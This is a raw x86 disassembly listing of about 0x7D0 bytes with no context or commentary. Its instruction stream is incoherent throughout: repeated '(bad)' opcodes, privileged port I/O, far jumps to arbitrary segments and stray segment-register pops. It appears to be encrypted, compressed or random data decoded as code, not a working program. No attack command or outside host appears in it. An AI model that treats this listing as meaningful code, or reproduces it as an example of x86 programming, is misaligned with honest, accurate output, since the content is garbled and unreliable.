  4029eb:	mov    esi,0x4fcf9dda
  4029f0:	dec    edi
  4029f1:	inc    ebx
  4029f2:	and    ecx,DWORD PTR ds:0x9a555022
  4029f8:	mov    edi,0xf3b0c49b
  4029fd:	clc    
  4029fe:	sub    edi,DWORD PTR ds:0x17691e0
  402a04:	mov    esp,0x360aeaab
  402a09:	push   esi
  402a0a:	in     al,dx
  402a0b:	aad    0x58
  402a0d:	and    bl,BYTE PTR [ebx-0x5a2cc76b]
  402a13:	xor    al,0x3d
  402a15:	push   esp
  402a16:	inc    ebx
  402a17:	(bad)  
  402a18:	loope  0x402a51
  402a1a:	jecxz  0x402a1e
  402a1c:	sbb    edi,esp
  402a1e:	push   ss
  402a1f:	(bad)  
  402a20:	push   ss
  402a21:	pushf  
  402a22:	pop    esi
  402a23:	push   ds
  402a24:	dec    eax
  402a25:	pop    ds
  402a26:	mov    dl,0x6d
  402a28:	xchg   ebx,eax
  402a29:	arpl   WORD PTR [edi+0x79],bp
  402a2c:	data16 lock xor BYTE PTR [eax+0x7b],dl
  402a31:	std    
  402a32:	xchg   esi,eax
  402a33:	and    dh,BYTE PTR [esi]
  402a35:	xor    bh,0x4a
  402a38:	out    dx,al
  402a39:	cmc    
  402a3a:	ds mov edx,0xd2566ac1
  402a40:	stos   BYTE PTR es:[edi],al
  402a41:	pop    ebp
  402a42:	scas   eax,DWORD PTR es:[edi]
  402a43:	fs iret 
  402a45:	lock pop edi
  402a47:	dec    edx
  402a48:	push   0xad827a7e
  402a4d:	int    0xf6
  402a4f:	ss js  0x402a8a
  402a52:	cwde   
  402a53:	sub    BYTE PTR [edi],ch
  402a55:	fwait
  402a56:	cmp    eax,0xd999ebfc
  402a5b:	stc    
  402a5c:	sbb    eax,0xd6465838
  402a61:	aaa    
  402a62:	daa    
  402a63:	jmp    0xd80e1ec5
  402a68:	cmc    
  402a69:	out    dx,eax
  402a6a:	mov    BYTE PTR [edx+0x286251a3],dh
  402a70:	clc    
  402a71:	cmp    al,0x47
  402a73:	jns    0x402aa7
  402a75:	mov    ebx,0xf78b4f64
  402a7a:	loopne 0x402abd
  402a7c:	in     al,0x19
  402a7e:	xlat   BYTE PTR ds:[ebx]
  402a7f:	not    DWORD PTR [edx]
  402a81:	inc    edi
  402a82:	mov    ebp,0x67ec63f3
  402a87:	popf   
  402a88:	xchg   edi,eax
  402a89:	adc    DWORD PTR [edx+0x256f1d96],0xfb8e14c2
  402a93:	fwait
  402a94:	cmp    eax,0x6253e5bd
  402a99:	imul   esi,esi,0xb15b6099
  402a9f:	adc    BYTE PTR [esp+esi*1-0x59],dh
  402aa3:	mov    ecx,0xf3d16132
  402aa8:	add    BYTE PTR ss:[edi+0x5f],dh
  402aac:	sub    cl,BYTE PTR [eax-0x7c1588b3]
  402ab2:	test   eax,0x864d6c5d
  402ab7:	jg     0x402aa1
  402ab9:	mov    dl,0x58
  402abb:	daa    
  402abc:	mov    esi,0xac5e0982
  402ac1:	push   esp
  402ac2:	ss mov eax,0x2ac2ed8c
  402ac8:	xchg   cl,bl
  402aca:	retf   0xce88
  402acd:	sti    
  402ace:	mov    esi,edi
  402ad0:	test   al,al
  402ad2:	push   ss
  402ad3:	ja     0x402aba
  402ad5:	(bad)  
  402ad6:	and    eax,0x83c31089
  402adb:	inc    ecx
  402adc:	aam    0xee
  402ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402adf:	popf   
  402ae0:	or     BYTE PTR [edi],bh
  402ae2:	inc    esp
  402ae3:	in     eax,0x47
  402ae5:	mov    esi,0xab0348b2
  402aea:	mov    ?,WORD PTR [edi]
  402aec:	lahf   
  402aed:	enter  0xdb9a,0xa
  402af1:	ja     0x402a88
  402af3:	mov    DWORD PTR [eax+0x5feecdb0],esp
  402af9:	xchg   ecx,eax
  402afa:	xor    BYTE PTR [edx+ebp*1],dh
  402afd:	popa   
  402afe:	mov    esi,0xbe3d8aaf
  402b03:	mov    dh,0x4a
  402b05:	sub    eax,0xb11e570c
  402b0a:	jmp    0xf6e922f5
  402b0f:	out    0x60,eax
  402b11:	xor    ebp,DWORD PTR [eax]
  402b13:	clc    
  402b14:	fwait
  402b15:	shr    DWORD PTR [edi+edi*4-0x61],0x15
  402b1a:	or     DWORD PTR [esi-0x789727f5],ecx
  402b20:	ss pop ecx
  402b22:	xchg   ecx,eax
  402b23:	shl    DWORD PTR [ebx-0x520acf94],cl
  402b29:	dec    esi
  402b2a:	fbstp  TBYTE PTR [ebx+0x5c027f9]
  402b30:	push   es
  402b31:	aas    
  402b32:	in     eax,0x94
  402b34:	jbe    0x402aea
  402b36:	add    DWORD PTR [esi],0x1
  402b39:	mov    bh,0x75
  402b3b:	push   ebp
  402b3c:	jo     0x402b85
  402b3e:	mov    esi,cs
  402b40:	mov    ds:0xdb7331b6,al
  402b45:	mov    dl,0x60
  402b47:	repnz clc 
  402b49:	loop   0x402b41
  402b4b:	push   ds
  402b4c:	ss lock push 0x293fd052
  402b53:	inc    ecx
  402b54:	idiv   DWORD PTR [ebp-0x612f2b7a]
  402b5a:	ins    BYTE PTR es:[edi],dx
  402b5b:	lods   eax,DWORD PTR ds:[esi]
  402b5c:	leave  
  402b5d:	cs inc esp
  402b5f:	lea    esp,[ecx]
  402b61:	in     eax,0x81
  402b63:	mov    al,ds:0x690b5880
  402b68:	das    
  402b69:	mul    DWORD PTR [edx]
  402b6b:	jnp    0x402b89
  402b6d:	adc    eax,0x633c7a70
  402b72:	je     0x402b2c
  402b74:	or     BYTE PTR [ebp-0x715d6326],al
  402b7a:	(bad)  
  402b7c:	pusha  
  402b7d:	sbb    al,0x37
  402b7f:	iret   
  402b80:	dec    ebp
  402b81:	lock adc eax,0x49d7a64f
  402b87:	mov    BYTE PTR [ebx-0x7],0x31
  402b8b:	nop
  402b8c:	mov    cl,0x52
  402b8e:	cmp    BYTE PTR [eax-0x3d244655],dl
  402b94:	popf   
  402b95:	cmp    cl,cl
  402b97:	mov    al,0x16
  402b99:	sub    ah,BYTE PTR [ebx-0x22c3007a]
  402b9f:	mov    cl,0x30
  402ba1:	sub    al,0xd
  402ba3:	nop
  402ba4:	cmp    BYTE PTR [esi-0x45],al
  402ba7:	cmc    
  402ba8:	shr    DWORD PTR [ecx],cl
  402baa:	pop    edx
  402bab:	pushf  
  402bac:	add    ecx,0xffffffe5
  402baf:	enter  0x9e9f,0xc5
  402bb3:	jmp    0xb05cae6f
  402bb8:	(bad)  
  402bb9:	sub    al,0xf4
  402bbb:	or     al,0xb9
  402bbd:	sbb    esp,ebx
  402bbf:	out    0x9e,eax
  402bc1:	inc    edx
  402bc2:	lods   eax,DWORD PTR ds:[esi]
  402bc3:	ins    DWORD PTR es:[edi],dx
  402bc4:	cmp    eax,0x9d3083e8
  402bc9:	fistp  QWORD PTR [ecx-0x32]
  402bcc:	icebp  
  402bcd:	aaa    
  402bce:	pop    edx
  402bcf:	pop    ss
  402bd0:	call   0x980aeaec
  402bd5:	inc    ebp
  402bd6:	xor    DWORD PTR [ecx+0x5b],0xfaccba32
  402bdd:	psubw  mm5,QWORD PTR [ecx-0x51]
  402be1:	les    eax,FWORD PTR ds:0xc05c4d83
  402be7:	inc    esp
  402be8:	ret    
  402be9:	icebp  
  402bea:	sti    
  402beb:	mov    cl,0xad
  402bed:	fmul   DWORD PTR [esi-0x8]
  402bf0:	outs   dx,DWORD PTR ds:[esi]
  402bf1:	leave  
  402bf2:	test   ebp,eax
  402bf4:	or     ecx,esp
  402bf6:	test   BYTE PTR [ebx-0x35],dh
  402bf9:	pop    ss
  402bfa:	test   DWORD PTR ds:0x9a81ba1e,eax
  402c00:	mov    bh,0x15
  402c02:	mov    WORD PTR [edx-0x744c717e],fs
  402c08:	aam    0xfb
  402c0a:	stos   DWORD PTR es:[edi],eax
  402c0b:	int3   
  402c0c:	and    BYTE PTR [eax],bl
  402c0e:	(bad)  
  402c0f:	push   ebp
  402c10:	adc    BYTE PTR [ebp+0x673ffb44],0x92
  402c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c18:	aad    0x6c
  402c1a:	(bad)  
  402c1b:	fsubr  DWORD PTR [ecx-0x66]
  402c1e:	and    al,0x95
  402c20:	sbb    DWORD PTR [ecx+ebx*8+0x55],edi
  402c24:	add    al,0xea
  402c26:	mov    WORD PTR [esi-0x4e],fs
  402c29:	or     al,0xb8
  402c2b:	xchg   edx,eax
  402c2c:	pop    ss
  402c2d:	nop
  402c2e:	inc    edx
  402c2f:	fist   DWORD PTR [esi-0x14]
  402c32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c33:	xchg   ebp,eax
  402c34:	lock test al,0x4c
  402c37:	cmp    al,0xd9
  402c39:	and    al,0x1e
  402c3b:	push   bp
  402c3d:	imul   BYTE PTR [edi]
  402c3f:	es aad 0xfa
  402c42:	pop    ebp
  402c43:	mov    edx,0x6ddb2a07
  402c48:	adc    al,0x92
  402c4a:	dec    ebx
  402c4b:	arpl   WORD PTR [esi+0x21],cx
  402c4e:	mov    dl,0xc4
  402c50:	push   ebx
  402c51:	jmp    0xed23:0x1b556740
  402c58:	push   ds
  402c59:	xchg   edx,eax
  402c5a:	aas    
  402c5b:	push   ss
  402c5c:	mov    ds:0x47246293,al
  402c61:	jae    0x402c52
  402c63:	hlt    
  402c64:	adc    DWORD PTR [eax-0x242d20],esi
  402c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c6b:	jbe    0x402bfd
  402c6d:	pop    esi
  402c6e:	adc    al,0x9a
  402c70:	mov    ah,0xeb
  402c72:	jp     0x402cc6
  402c74:	test   eax,0x89d81ec6
  402c79:	adc    ebx,DWORD PTR [edx]
  402c7b:	(bad)  
  402c7c:	mov    edi,0x1f56f321
  402c81:	lahf   
  402c82:	mov    ebp,0xc747ca4c
  402c87:	mov    esp,0xe0b096b0
  402c8c:	popa   
  402c8d:	enter  0x7d27,0xd4
  402c91:	mov    ds:0xeebef154,eax
  402c96:	jg     0x402cd0
  402c98:	sub    BYTE PTR [esi+0x76d51386],0x96
  402c9f:	pop    es
  402ca0:	mov    bh,BYTE PTR [edx-0x555191a5]
  402ca6:	mov    cl,BYTE PTR [eax]
  402ca8:	and    esi,esp
  402caa:	cmp    edi,DWORD PTR [edi]
  402cac:	cld    
  402cad:	js     0x402cbd
  402caf:	push   es
  402cb0:	fadd   QWORD PTR [eax]
  402cb2:	cwde   
  402cb3:	sti    
  402cb4:	mov    ah,0x67
  402cb6:	pusha  
  402cb7:	aam    0x6f
  402cb9:	dec    ecx
  402cba:	and    ebx,DWORD PTR [edx]
  402cbc:	enter  0x2d0b,0x6d
  402cc0:	dec    edi
  402cc1:	pop    es
  402cc2:	push   ds
  402cc3:	mov    edi,0xf9418412
  402cc8:	scas   eax,DWORD PTR es:[edi]
  402cc9:	jnp    0x402cee
  402ccb:	lahf   
  402ccc:	cmp    eax,0x4f5f5471
  402cd1:	fwait
  402cd2:	aaa    
  402cd3:	cmp    eax,DWORD PTR [eax+0x64]
  402cd6:	adc    DWORD PTR [eax],ebp
  402cd8:	pusha  
  402cd9:	(bad)  
  402cda:	out    0x2a,eax
  402cdc:	stc    
  402cdd:	inc    BYTE PTR [edx+eiz*1+0x658f6677]
  402ce4:	sahf   
  402ce5:	adc    al,0x2d
  402ce7:	pop    ss
  402ce8:	out    dx,eax
  402ce9:	xor    BYTE PTR [esi-0x2f],0x3b
  402ced:	pop    es
  402cee:	xchg   ebp,eax
  402cef:	push   cs
  402cf0:	cwde   
  402cf1:	mov    edx,0x1a5791ed
  402cf6:	push   ebp
  402cf7:	push   esi
  402cf8:	mov    ?,WORD PTR ss:[eax+0x75]
  402cfc:	jnp    0x402d0b
  402cfe:	pop    es
  402cff:	lods   al,BYTE PTR ds:[esi]
  402d00:	retf   
  402d01:	mov    DWORD PTR ds:[esi+0x788bc411],esp
  402d08:	pop    es
  402d09:	mov    edi,0xbedb0ac3
  402d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d0f:	dec    ecx
  402d10:	popa   
  402d11:	jle    0x402d50
  402d13:	gs cmp eax,0x4ecf6989
  402d19:	dec    edx
  402d1a:	xchg   edi,eax
  402d1b:	push   ss
  402d1c:	lods   al,BYTE PTR ds:[esi]
  402d1d:	scas   al,BYTE PTR es:[edi]
  402d1e:	push   cs
  402d1f:	rcr    edx,cl
  402d21:	sbb    ecx,eax
  402d23:	je     0x402d3e
  402d25:	xchg   BYTE PTR [esi+0x7d],bl
  402d28:	pop    ds
  402d29:	ss xor al,dl
  402d2c:	mov    esi,0x3161a1a0
  402d31:	mov    al,0x56
  402d33:	in     eax,dx
  402d34:	and    eax,0x5b7637a6
  402d39:	or     ah,ah
  402d3b:	aaa    
  402d3c:	adc    bl,al
  402d3e:	inc    DWORD PTR [edi+0x3c]
  402d41:	ins    BYTE PTR es:[edi],dx
  402d42:	lea    esp,[ebx]
  402d44:	or     al,BYTE PTR [edi+0x5dab50f0]
  402d4a:	data16 mov bl,0x6a
  402d4d:	je     0x402ce4
  402d4f:	mov    al,0x22
  402d51:	dec    edi
  402d52:	push   edi
  402d53:	enter  0xafd6,0x5
  402d57:	xchg   DWORD PTR [eax],ecx
  402d59:	test   BYTE PTR [edx+0x4b],dh
  402d5c:	xchg   ecx,eax
  402d5d:	sbb    DWORD PTR [eax],edi
  402d5f:	xor    BYTE PTR [eax-0xbf72749],al
  402d65:	cs aam 0xb
  402d68:	push   0xffffffb8
  402d6a:	mov    eax,ds:0xfefc9ac7
  402d6f:	stos   DWORD PTR es:[edi],eax
  402d70:	gs jmp 0xdc5e:0xe26731ce
  402d78:	push   ds
  402d79:	jecxz  0x402d0f
  402d7b:	mov    ah,BYTE PTR ds:0xd8ca267f
  402d81:	add    al,0x32
  402d83:	sub    DWORD PTR ds:0xa75d6c8d,edi
  402d89:	aam    0xbd
  402d8b:	and    DWORD PTR [edx-0x313048dd],0x8b206bb2
  402d95:	std    
  402d96:	jl     0x402dfa
  402d98:	fnstsw WORD PTR [edx-0x63]
  402d9b:	inc    esp
  402d9c:	add    dh,BYTE PTR ds:0xb4235607
  402da2:	or     dl,cl
  402da4:	icebp  
  402da5:	in     eax,0x74
  402da7:	sbb    dh,BYTE PTR [esi-0x68cf37f7]
  402dad:	pop    esi
  402dae:	movaps XMMWORD PTR [edx-0x7e],xmm6
  402db2:	retf   
  402db3:	pop    edi
  402db4:	(bad)  
  402db5:	scas   eax,DWORD PTR es:[edi]
  402db6:	xchg   ebp,eax
  402db7:	sub    DWORD PTR [edx],edi
  402db9:	jbe    0x402dec
  402dbb:	js     0x402e06
  402dbd:	test   ah,cl
  402dbf:	retf   
  402dc0:	xor    al,0x15
  402dc2:	pop    ds
  402dc3:	mov    al,0x5f
  402dc5:	dec    edx
  402dc6:	push   ecx
  402dc7:	call   0xca65:0xf38c109f
  402dce:	jge    0x402ddb
  402dd0:	adc    BYTE PTR [esi],cl
  402dd2:	mov    WORD PTR [edx-0x7d],?
  402dd5:	fstp   DWORD PTR [eax-0x6cd4262a]
  402ddb:	in     eax,0x97
  402ddd:	pop    eax
  402dde:	fld    QWORD PTR [edi+0x17]
  402de1:	sbb    BYTE PTR [edi],al
  402de3:	gs pop ebx
  402de5:	xor    ch,BYTE PTR [ebp+0x4431fb7c]
  402deb:	jno    0x402e22
  402ded:	fld    DWORD PTR [edx-0x7f]
  402df0:	pop    esp
  402df1:	fst    QWORD PTR [eax-0x7d7fd25e]
  402df7:	dec    edx
  402df8:	push   ss
  402df9:	loopne 0x402dd5
  402dfb:	fld    TBYTE PTR ds:0x12835204
  402e01:	xchg   edx,eax
  402e02:	dec    ecx
  402e03:	dec    eax
  402e04:	adc    al,0x95
  402e06:	xlat   BYTE PTR ds:[ebx]
  402e07:	out    0x86,eax
  402e09:	adc    al,0x40
  402e0b:	adc    bl,BYTE PTR [eax]
  402e0d:	popf   
  402e0e:	cwde   
  402e0f:	push   0x611b39af
  402e14:	stos   DWORD PTR es:[edi],eax
  402e15:	sbb    DWORD PTR [eax+ebp*1],esi
  402e18:	outs   dx,BYTE PTR ds:[esi]
  402e19:	out    0xbb,eax
  402e1b:	inc    esi
  402e1c:	retf   0x8b08
  402e1f:	xor    BYTE PTR [esi+0x4141ddb4],bl
  402e25:	pop    ebx
  402e26:	pop    esi
  402e27:	adc    eax,0xda3d40a6
  402e2c:	popf   
  402e2d:	dec    ebx
  402e2e:	push   esp
  402e2f:	xor    esi,0x46e9b3a0
  402e35:	inc    edi
  402e36:	mov    eax,0x4176a14a
  402e3b:	sbb    bh,BYTE PTR [esi]
  402e3d:	(bad)  
  402e3e:	jg     0x402e7f
  402e40:	inc    ebp
  402e41:	mov    ecx,0x3555c5c9
  402e46:	fidiv  DWORD PTR [ebx-0x5b61b586]
  402e4c:	daa    
  402e4d:	mov    al,ds:0x7fa71302
  402e52:	push   ebp
  402e53:	xchg   DWORD PTR [edx-0x33ab4279],esi
  402e59:	pop    esi
  402e5a:	sub    DWORD PTR ss:[ebp+ecx*2+0x1b],edx
  402e5f:	push   es
  402e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e62:	add    al,cl
  402e64:	enter  0x761,0xc
  402e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e69:	sbb    al,0x1d
  402e6b:	mov    ebp,0x90e26e78
  402e70:	ror    DWORD PTR [edi+0x27198cf2],1
  402e76:	xchg   edx,eax
  402e77:	jl     0x402e76
  402e79:	dec    ecx
  402e7a:	pop    ds
  402e7b:	mov    bl,0x16
  402e7d:	cmp    BYTE PTR [edx-0x5e54a2d1],bl
  402e83:	dec    eax
  402e84:	addr16 inc eax
  402e86:	cmp    esi,DWORD PTR [ebx]
  402e88:	adc    esp,esp
  402e8a:	sbb    al,0x9a
  402e8c:	pop    es
  402e8d:	imul   edi,DWORD PTR [eax],0x733cb480
  402e93:	push   esp
  402e94:	icebp  
  402e95:	jmp    0xe7dbcd2b
  402e9a:	(bad)  
  402e9b:	sub    al,0x45
  402e9d:	adc    eax,0xd723c23a
  402ea2:	int3   
  402ea3:	ins    BYTE PTR es:[edi],dx
  402ea4:	push   esi
  402ea5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ea6:	icebp  
  402ea7:	jg     0x402f0f
  402ea9:	push   cs
  402eaa:	jle    0x402eca
  402eac:	clc    
  402ead:	pop    esi
  402eae:	and    al,0x67
  402eb0:	mov    dh,BYTE PTR [edx]
  402eb2:	fstp   QWORD PTR [ebp-0x674c8a7b]
  402eb8:	ins    BYTE PTR es:[edi],dx
  402eb9:	jecxz  0x402e81
  402ebb:	mov    dl,0xa2
  402ebd:	adc    al,0x72
  402ebf:	lds    esp,FWORD PTR [eax]
  402ec1:	in     eax,0xec
  402ec3:	das    
  402ec4:	mov    bh,0x5d
  402ec6:	mov    edi,0xb8ac2498
  402ecb:	add    al,0x41
  402ecd:	and    edx,esi
  402ecf:	fisubr DWORD PTR [ecx-0x377c4eb5]
  402ed5:	mov    esp,0x74591f3b
  402eda:	inc    ebx
  402edb:	mov    WORD PTR [esi],es
  402edd:	xchg   ebx,eax
  402ede:	pop    edx
  402edf:	or     DWORD PTR [edx+0x26f63eba],esp
  402ee5:	test   ch,cl
  402ee7:	mov    dl,0x84
  402ee9:	ds pop ebp
  402eeb:	jae    0x402e9c
  402eed:	sahf   
  402eee:	neg    dh
  402ef0:	in     al,0x94
  402ef2:	outs   dx,DWORD PTR ds:[esi]
  402ef3:	les    esp,FWORD PTR [ecx+0x1c]
  402ef6:	lods   al,BYTE PTR ds:[esi]
  402ef7:	retf   
  402ef8:	mul    esi
  402efa:	(bad)  
  402efb:	jmp    0xe23b0c09
  402f00:	lahf   
  402f01:	adc    al,0x38
  402f03:	lea    edi,[edi-0x2ecffd88]
  402f09:	retf   0xff98
  402f0c:	idiv   BYTE PTR [edx+0x50]
  402f0f:	mov    ecx,0xe7bea4ed
  402f14:	jmp    0x402f2a
  402f16:	xchg   edx,eax
  402f17:	out    0x47,eax
  402f19:	and    al,0x26
  402f1b:	call   0xf468:0x5db42d07
  402f22:	add    DWORD PTR [ebx],eax
  402f24:	mov    eax,ds:0x179c2add
  402f29:	inc    ecx
  402f2a:	mov    ch,0x3a
  402f2c:	mov    ch,0x67
  402f2e:	fcmovne st,st(2)
  402f30:	jp     0x402f67
  402f32:	int    0x1f
  402f34:	xlat   BYTE PTR ds:[ebx]
  402f35:	dec    DWORD PTR [ebp-0x58]
  402f38:	loop   0x402f74
  402f3a:	inc    edi
  402f3b:	jae    0x402f42
  402f3d:	int    0x1f
  402f3f:	lock sbb BYTE PTR [eax],bh
  402f42:	push   ds
  402f43:	call   0x1aa0:0x3a182338
  402f4a:	(bad)  
  402f4b:	out    0xea,al
  402f4d:	int3   
  402f4e:	cmp    BYTE PTR [edx-0x69561e96],bl
  402f54:	pop    ecx
  402f55:	ret    
  402f56:	ins    BYTE PTR es:[edi],dx
  402f57:	or     DWORD PTR [ebp-0x15ce76ed],ecx
  402f5d:	shr    BYTE PTR [ebp-0x14],cl
  402f60:	push   ebx
  402f61:	add    DWORD PTR [ebx-0x7d],esp
  402f64:	psraw  mm4,QWORD PTR [edx+eax*1]
  402f68:	icebp  
  402f69:	dec    edx
  402f6a:	vpsllw xmm2,xmm2,xmm4
  402f6e:	inc    eax
  402f6f:	xor    al,0x2d
  402f71:	shl    BYTE PTR [edi+0x4e6138ec],0x23
  402f78:	jnp    0x402fa8
  402f7a:	xor    DWORD PTR [esi-0x38f0d012],edi
  402f80:	inc    ebx
  402f81:	dec    esi
  402f82:	fwait
  402f83:	xor    al,0x4e
  402f85:	xor    ebp,DWORD PTR [edi+edx*1]
  402f88:	jp     0x402f51
  402f8a:	add    edx,ebp
  402f8c:	stos   BYTE PTR es:[edi],al
  402f8d:	lods   al,BYTE PTR ds:[esi]
  402f8e:	mov    ebp,0xd72fc4a3
  402f93:	sub    ch,dh
  402f95:	mov    dh,0x2b
  402f97:	mov    al,ds:0x9b8dc699
  402f9c:	ins    DWORD PTR es:[edi],dx
  402f9d:	cmc    
  402f9e:	mov    esi,0xf5360aea
  402fa3:	mov    esi,0xb846fd29
  402fa8:	sub    esi,DWORD PTR [esi-0x2c21fdd]
  402fae:	sub    DWORD PTR [ebx+0xe3c99c1],0x9609ac54
  402fb8:	stc    
  402fb9:	inc    esp
  402fba:	fst    DWORD PTR [bx]
  402fbd:	dec    esp
  402fbe:	jbe    0x402f41
  402fc0:	xor    ch,BYTE PTR [esi]
  402fc2:	push   0xffffffee
  402fc4:	lods   eax,DWORD PTR ds:[esi]
  402fc5:	mul    DWORD PTR [ebx+0x59]
  402fc8:	sub    al,0x72
  402fca:	je     0x402f9a
  402fcc:	les    ebx,FWORD PTR [edi+0x3d]
  402fcf:	jmp    0xc8362676
  402fd4:	jp     0x402ff4
  402fd6:	int3   
  402fd7:	xor    al,0x2b
  402fd9:	dec    edx
  402fda:	push   0xa29924a8
  402fdf:	or     eax,0xe7e95b6b
  402fe4:	inc    edi
  402fe5:	adc    edi,0xffffff9b
  402fe8:	cmp    edx,DWORD PTR [esi-0x1cdcf89e]
  402fee:	sbb    DWORD PTR [esi],edx
  402ff0:	not    DWORD PTR ds:0x28f800d4
  402ff6:	jo     0x402f86
  402ff8:	cwde   
  402ff9:	sub    edi,esi
  402ffb:	mov    ds:0x63a67649,al
  403000:	into   
  403001:	xor    ecx,DWORD PTR [eax+0x9]
  403004:	loop   0x402fd5
  403006:	imul   ebp,DWORD PTR [ebp-0x4e8e80f9],0x9ae327fb
  403010:	stc    
  403011:	ret    0x6302
  403014:	into   
  403015:	jmp    0xf510:0x32b13398
  40301c:	adc    al,0x4
  40301e:	rcr    BYTE PTR [ebp-0x1a],0xdd
  403022:	rcl    DWORD PTR [eax-0x69e0f6d9],1
  403028:	nop
  403029:	lea    ecx,[eax]
  40302b:	adc    BYTE PTR [edi+0x21],bl
  40302e:	ja     0x40304b
  403030:	push   ecx
  403031:	jecxz  0x403043
  403033:	in     eax,0x9d
  403035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403036:	clc    
  403037:	mov    bh,0xbb
  403039:	test   al,0x61
  40303b:	add    ecx,DWORD PTR ds:0xae6f0d2e
  403041:	mov    WORD PTR [edi-0x7ba81bc2],gs
  403047:	leave  
  403048:	mov    BYTE PTR [ecx+0x6e],al
  40304b:	inc    ebp
  40304c:	test   eax,0xd64be317
  403051:	cmp    DWORD PTR [edx],ecx
  403053:	fwait
  403054:	mov    cl,0x30
  403056:	je     0x403050
  403058:	push   ecx
  403059:	sub    eax,0xb161f07f
  40305e:	cmp    al,0x7f
  403060:	(bad)  [edx+0x3107de43]
  403066:	ret    
  403067:	test   al,0xa0
  403069:	mov    edi,0x877feea3
  40306e:	leave  
  40306f:	mov    edx,0xd0baa6ab
  403074:	lea    esp,[edx-0x6cf25830]
  40307a:	imul   ebp,DWORD PTR [edi+0x71506506],0x72168425
  403084:	fnstcw WORD PTR [ebx-0x2d92fb0d]
  40308a:	cs mov esp,0x22f65b78
  403090:	inc    esi
  403091:	mul    ch
  403093:	mov    bl,0x2c
  403095:	loopne 0x403024
  403097:	push   0xfcb8187a
  40309c:	ds dec edi
  40309e:	adc    BYTE PTR [edx-0x40],dh
  4030a1:	idiv   DWORD PTR [esi]
  4030a3:	(bad)  
  4030a5:	push   cs
  4030a6:	inc    edx
  4030a7:	cmp    ch,ah
  4030a9:	jmp    0x672b:0xf4e26e61
  4030b0:	pop    ax
  4030b2:	fimul  DWORD PTR [ebp+eiz*8+0x5e616524]
  4030b9:	dec    ebx
  4030ba:	stc    
  4030bb:	imul   edi,DWORD PTR [ebx+0x67],0x4a
  4030bf:	popa   
  4030c0:	mov    DWORD PTR ds:[esi-0x57],edx
  4030c4:	mov    cl,0x8f
  4030c6:	cmp    al,0x1c
  4030c8:	out    dx,eax
  4030c9:	iret   
  4030ca:	mov    WORD PTR [ecx+0xe],ss
  4030cd:	pop    ecx
  4030ce:	lahf   
  4030cf:	jmp    0xbcdce69d
  4030d4:	rcr    esi,cl
  4030d6:	loopne 0x4030d6
  4030d8:	ror    BYTE PTR [ebp+0x41],1
  4030db:	lods   al,BYTE PTR ds:[esi]
  4030dc:	mov    esp,0x713d63d1
  4030e1:	repz js 0x403107
  4030e4:	inc    ebx
  4030e5:	xlat   BYTE PTR ds:[ebx]
  4030e6:	sbb    ebp,edi
  4030e8:	ss and al,0x27
  4030eb:	sbb    bh,dl
  4030ed:	and    eax,0x9e0c9116
  4030f2:	fsubr  QWORD PTR [ebx*8-0x35b2c28d]
  4030f9:	lea    esp,[ecx-0x31]
  4030fc:	popf   
  4030fd:	in     eax,dx
  4030fe:	inc    eax
  4030ff:	(bad)  
  403101:	adc    al,0xdb
  403103:	cmp    DWORD PTR [eax],0xfffffff1
  403106:	xchg   esp,eax
  403107:	in     al,0x13
  403109:	cmp    eax,DWORD PTR [edi-0x218bdcb2]
  40310f:	pop    ebx
  403110:	lahf   
  403111:	cwde   
  403112:	xor    al,0x4f
  403114:	scas   al,BYTE PTR es:[edi]
  403115:	jnp    0x40314c
  403117:	xor    BYTE PTR [ebx+0x64],0xdf
  40311b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311c:	inc    eax
  40311d:	mov    BYTE PTR ds:0xd827d3e1,dl
  403123:	std    
  403124:	sub    eax,0xedce4a37
  403129:	sahf   
  40312a:	shl    DWORD PTR ds:0x37487997,0xbd
  403131:	mov    BYTE PTR [ebx-0x44],ah
  403134:	push   edx
  403135:	adc    ebx,DWORD PTR [edx]
  403137:	jb     0x4031a3
  403139:	repz ss jno 0x40316b
  40313d:	fsub   DWORD PTR [eax-0x521918b3]
  403143:	icebp  
  403144:	push   esi
  403145:	xchg   esp,eax
  403146:	xchg   ebx,eax
  403147:	int3   
  403148:	push   0x108e807
  40314d:	mov    esi,0xdfdaaf14
  403152:	adc    al,0x40
  403154:	jg     0x40314b
  403156:	test   eax,0x1c72cae8
  40315b:	push   ebx
  40315c:	or     dh,BYTE PTR [ebp-0x1c]
  40315f:	loop   0x403111
  403161:	ins    DWORD PTR es:[edi],dx
  403162:	pop    edx
  403163:	pusha  
  403164:	sub    DWORD PTR [eax+eiz*8],esi
  403167:	imul   ebp,ecx,0xf5745bb5
  40316d:	cli    
  40316e:	sbb    DWORD PTR [edx-0x34],esp
  403171:	inc    ecx
  403172:	popf   
  403173:	adc    al,0xf
  403175:	push   ebp
  403176:	add    ah,BYTE PTR ds:0xea051c17
  40317c:	adc    ch,dh
  40317e:	mov    bh,0x1e
  403180:	and    BYTE PTR [eax-0x4a],dl
  403183:	dec    ecx
  403184:	(bad)  
  403185:	cdq    
  403186:	xchg   edi,eax
  403187:	mov    eax,ds:0x947d0941
  40318c:	les    edi,FWORD PTR [eax*4-0x3366cae1]
  403193:	or     bh,BYTE PTR [ebx-0x6f]
  403196:	xor    al,0xb3
  403198:	fcomi  st,st(7)
  40319a:	scas   eax,DWORD PTR es:[edi]
  40319b:	jns    0x403128
  40319d:	fst    QWORD PTR [ebx+eiz*1]
  4031a0:	push   ds
  4031a1:	and    al,0xfd
  4031a3:	fs pop ebp
  4031a5:	arpl   WORD PTR [edi],sp
  4031a7:	cld    
  4031a8:	shl    ebx,0x51
  4031ab:	hlt    
  4031ac:	bound  ecx,QWORD PTR cs:[esi+eiz*4]
  4031b0:	scas   al,BYTE PTR es:[edi]
  4031b1:	pusha  
  4031b2:	sbb    dl,BYTE PTR [edi-0x2ce89a96]
  4031b8:	and    eax,0x5051cc6e
  4031bd:	jnp    0x40320a
  4031bf:	(bad)  
  4031c0:	jmp    0x9e3:0xb4d7c711
